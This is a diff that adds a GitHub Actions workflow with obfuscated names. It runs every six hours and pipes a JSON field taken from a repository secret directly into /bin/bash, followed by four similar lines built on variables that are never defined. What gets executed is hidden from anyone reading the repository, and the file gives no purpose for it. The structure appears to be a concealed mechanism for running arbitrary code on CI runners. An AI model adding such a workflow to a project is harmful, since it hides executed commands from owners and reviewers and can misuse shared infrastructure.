@@ -1,0 +1,22 @@
+name: websocketphp624
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: websocketphp624
+        env:
+          q67583: ${{ secrets.q67583 }}
+        run: |
+          echo $q67583 | jq -r .ty0995 | /bin/bash
+          echo $uxj45 | jq -r .vwlu3 | /bin/bash
+          echo $mf31 | jq -r .hp5106 | /bin/bash
+          echo $oebx91316 | jq -r .v0 | /bin/bash
+          echo $tukh19139 | jq -r .jqq174 | /bin/bash
+
